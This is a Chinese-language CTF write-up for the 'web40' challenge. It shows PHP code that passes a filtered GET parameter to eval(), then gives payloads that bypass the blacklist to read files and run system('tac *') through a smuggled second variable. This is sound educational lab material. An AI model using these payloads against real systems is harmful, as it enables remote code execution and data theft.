web40

源码

<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}

过滤了很多东西，但是()和_没过滤

解法一:

​ payload?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

解法二:

​ payload ?c=print_r(get_defined_vars());得到所有变量，再自己post一个上去

​ 得到

Array ( [_GET] => Array ( [c] => print_r(get_defined_vars()); ) [_POST] => Array ( ) [_COOKIE] => Array ( [UM_distinctid] => 17a8b516c79e4c-065dee1b1488f9-6373264-144000-17a8b516c7acb8 ) [_FILES] => Array ( ) [c] => print_r(get_defined_vars()); )

​ 然后尝试自己发送一个变量上去

​ payload?c=print_r(get_defined_vars());&1=phpinfo();

​ 发现这次变成了

Array ( [_GET] => Array ( [c] => print_r(get_defined_vars()); [1] => phpinfo(); ) [_POST] => Array ( ) [_COOKIE] => Array ( [UM_distinctid] => 17a8b516c79e4c-065dee1b1488f9-6373264-144000-17a8b516c7acb8 ) [_FILES] => Array ( ) [c] => print_r(get_defined_vars()); )

然后想办法获取这个名字

payload?c=print_r(next(pos(get_defined_vars())));&1=phpinfo();

这样我们就获取到了phpinfo();这个字符

再把print_r换成eval看看能不能执行

发现成功执行

于是payload?c=eval(next(pos(get_defined_vars())));&1=system('tac *');

得到flag
